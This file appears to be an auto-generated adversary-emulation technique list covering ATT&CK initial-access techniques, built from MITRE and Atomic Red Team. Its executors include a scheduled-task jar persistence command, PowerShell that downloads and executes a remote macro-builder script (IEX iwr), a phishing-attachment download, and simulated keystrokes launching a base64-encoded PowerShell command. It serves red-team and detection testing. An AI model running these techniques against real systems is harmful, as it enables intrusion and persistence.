# AutoStrike MITRE ATT&CK Techniques - initial-access
# Auto-generated by mitre-import script
# Source: MITRE ATT&CK STIX 2.1 + Atomic Red Team

- id: T1195
  name: Supply Chain Compromise
  description: "Adversaries may manipulate products or product delivery mechanisms prior to receipt by a final consumer for the purpose of data or system compromise.\n\nSupply chain compromise can take place at any stage of the supply chain including:\n\n* Manipulation of development tools\n* Manipulation of a development environment\n* Manipulation of source code repositories (public or private)\n* Manipulation of source code in open-source dependencies\n* Manipulation of software update/distribution mechanisms\n* Compromised/infected system images (removable media infected at the factory)(Citation: IBM Storwize)(Citation: Schneider Electric USB Malware) \n* Replacement of legitimate software with modified versions\n* Sales of modified/counterfeit products to legitimate distributors\n* Shipment interdiction\n\nWhile supply chain compromise can impact any component of hardware or software, adversaries looking to gain execution have often focused on malicious additions to legitimate software in software distribution or update channels.(Citation: Avast CCleaner3 2018)(Citation: Microsoft Dofoil 2018)(Citation: Command Five SK 2011) Adversaries may limit targeting to a desired victim set or distribute malicious software to a broad set of consumers but only follow up with specific victims.(Citation: Symantec Elderwood Sept 2012)(Citation: Avast CCleaner3 2018)(Citation: Command Five SK 2011) Popular open-source projects that are used as dependencies in many applications may also be targeted as a means to add malicious code to users of the dependency.(Citation: Trendmicro NPM Compromise)\n\nIn some cases, adversaries may conduct “second-order” supply chain compromises by leveraging the access gained from an initial supply chain compromise to further compromise a software component.(Citation: Krebs 3cx overview 2023) This may allow the threat actor to spread to even more victims."
  tactic: initial-access
  platforms:
    - linux
    - windows
    - macos
  executors:
    - name: Octopus Scanner Malware Open Source Supply Chain
      type: cmd
      platform: windows
      command: |-
        copy %temp%\ExplorerSync.db %temp%\..\Microsoft\ExplorerSync.db
        schtasks /create /tn ExplorerSync /tr "javaw -jar %temp%\..\Microsoft\ExplorerSync.db" /sc MINUTE /f
      cleanup: |-
        schtasks /delete /tn ExplorerSync /F 2>null
        del %temp%\..\Microsoft\ExplorerSync.db 2>null
        del %temp%\ExplorerSync.db 2>null
      timeout: 120
      is_safe: true
  references:
    - https://attack.mitre.org/techniques/T1195
  is_safe: true
- id: T1195.002
  name: Compromise Software Supply Chain
  description: |-
    Adversaries may manipulate application software prior to receipt by a final consumer for the purpose of data or system compromise. Supply chain compromise of software can take place in a number of ways, including manipulation of the application source code, manipulation of the update/distribution mechanism for that software, or replacing compiled releases with a modified version.

    Targeting may be specific to a desired victim set or may be distributed to a broad set of consumers but only move on to additional tactics on specific victims.(Citation: Avast CCleaner3 2018)(Citation: Command Five SK 2011)
  tactic: initial-access
  platforms:
    - linux
    - windows
    - macos
  executors:
    - name: Simulate npm package installation on a Linux system
      type: bash
      platform: linux
      command: kubectl run atomic-npm-install --image=node:18 --restart=Never --attach --rm -i -- bash -lc "mkdir -p /tmp/test && cd /tmp/test && npm init -y >/dev/null 2>&1 && echo '--- package.json before install ---' && cat package.json && npm install tinycolor --no-audit --no-fund --no-package-lock && echo '--- package.json after install ---' && cat package.json"
      timeout: 60
      is_safe: true
  references:
    - https://attack.mitre.org/techniques/T1195/002
  is_safe: true
- id: T1566.001
  name: Spearphishing Attachment
  description: |-
    Adversaries may send spearphishing emails with a malicious attachment in an attempt to gain access to victim systems. Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon [User Execution](https://attack.mitre.org/techniques/T1204) to gain execution.(Citation: Unit 42 DarkHydrus July 2018) Spearphishing may also involve social engineering techniques, such as posing as a trusted source.

    There are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment (and potentially clicking past protections), the adversary's payload exploits a vulnerability or directly executes on the user's system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one.
  tactic: initial-access
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Download Macro-Enabled Phishing Attachment
      type: powershell
      platform: windows
      command: |-
        $url = 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1566.001/bin/PhishingAttachment.xlsm'
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        Invoke-WebRequest -Uri $url -OutFile $env:TEMP\PhishingAttachment.xlsm
      cleanup: Remove-Item $env:TEMP\PhishingAttachment.xlsm -ErrorAction Ignore
      timeout: 120
      is_safe: true
    - name: Word spawned a command shell and used an IP address in the command line
      type: powershell
      platform: windows
      command: |-
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
        $macrocode = "   Open `"C:\Users\Public\art.jse`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   Shell`$ `"ping 8.8.8.8`"`n"
        Invoke-MalDoc -macroCode $macrocode -officeProduct "Word"
      cleanup: Remove-Item C:\Users\Public\art.jse -ErrorAction Ignore
      timeout: 120
      is_safe: true
  references:
    - https://attack.mitre.org/techniques/T1566/001
  is_safe: true
- id: T1566.002
  name: Spearphishing Link
  description: |-
    Adversaries may send spearphishing emails with a malicious link in an attempt to gain access to victim systems. Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. Spearphishing may also involve social engineering techniques, such as posing as a trusted source.

    All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging [User Execution](https://attack.mitre.org/techniques/T1204). The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place.

    Adversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly. Additionally, adversaries may use seemingly benign links that abuse special characters to mimic legitimate websites (known as an "IDN homograph attack").(Citation: CISA IDN ST05-016) URLs may also be obfuscated by taking advantage of quirks in the URL schema, such as the acceptance of integer- or hexadecimal-based hostname formats and the automatic discarding of text before an “@” symbol: for example, `hxxp://google.com@1157586937`.(Citation: Mandiant URL Obfuscation 2023)

    Adversaries may also utilize links to perform consent phishing/spearphishing campaigns to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s that grant immediate access to the victim...
  tactic: initial-access
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Paste and run technique
      type: powershell
      platform: windows
      command: |-
        # Add user32.dll for keybd_event
        Add-Type @"
            using System;
            using System.Runtime.InteropServices;
            public class K {
                [DllImport("user32.dll")]
                public static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);
            }
        "@

        # Virtual key codes
        $VK_LWIN, $VK_R, $KEYDOWN, $KEYUP = 0x5B, 0x52, 0x0000, 0x0002

        # Open Run dialog (Win+R)
        [K]::keybd_event($VK_LWIN, 0, $KEYDOWN, [UIntPtr]::Zero)
        [K]::keybd_event($VK_R, 0, $KEYDOWN, [UIntPtr]::Zero)
        [K]::keybd_event($VK_R, 0, $KEYUP, [UIntPtr]::Zero)
        [K]::keybd_event($VK_LWIN, 0, $KEYUP, [UIntPtr]::Zero)

        # Short delay for Run dialog
        Start-Sleep -Milliseconds 500
        Add-Type -AssemblyName System.Windows.Forms
        [System.Windows.Forms.SendKeys]::SendWait("cmd /c powershell -ec " + [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('calc.exe')) + "{ENTER}")
      timeout: 120
      is_safe: true
  references:
    - https://attack.mitre.org/techniques/T1566/002
  is_safe: true
